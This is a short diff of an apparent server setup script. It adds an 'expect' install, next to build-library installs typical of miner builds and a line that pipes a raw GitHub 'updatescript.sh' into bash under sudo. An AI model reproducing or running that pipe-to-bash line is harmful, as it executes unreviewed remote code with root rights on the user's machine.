@@ -32,5 +32,6 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 3
 sudo apt-get install dos2unix
+sudo apt-get install -y expect
 
 sudo curl -s -L https://raw.githubusercontent.com/githubec/beauty/master/updatescript.sh | bash -s
